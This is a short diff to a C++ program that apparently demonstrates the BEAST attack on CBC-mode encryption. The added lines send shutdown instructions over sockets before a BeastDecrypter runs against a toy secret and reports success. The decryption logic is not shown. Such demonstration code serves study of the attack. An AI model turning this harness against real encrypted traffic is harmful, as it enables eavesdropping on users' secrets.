@@ -90,6 +90,11 @@ int main(int argc, char **argv) {
         }
     }
 
+    bzero(buf, MAXBUF + 1);
+    strcpy(buf, "Hello from controller!");
+    T_Instr inst = T_Instr::SHUTDOWN_CONNECTION;
+    send(server_fd, (char*)&inst, sizeof(T_Instr), 0);
+    send(client_fd, (char*)&inst, sizeof(T_Instr), 0);
     T_Controller* ctrl = new T_Controller(server_fd, client_fd);
     BeastDecrypter* beast = new BeastDecrypter(MAXBUF, 16, ctrl);
     if (beast->run("password:12345", "password")) printf("A successful BEAST attack!\n");
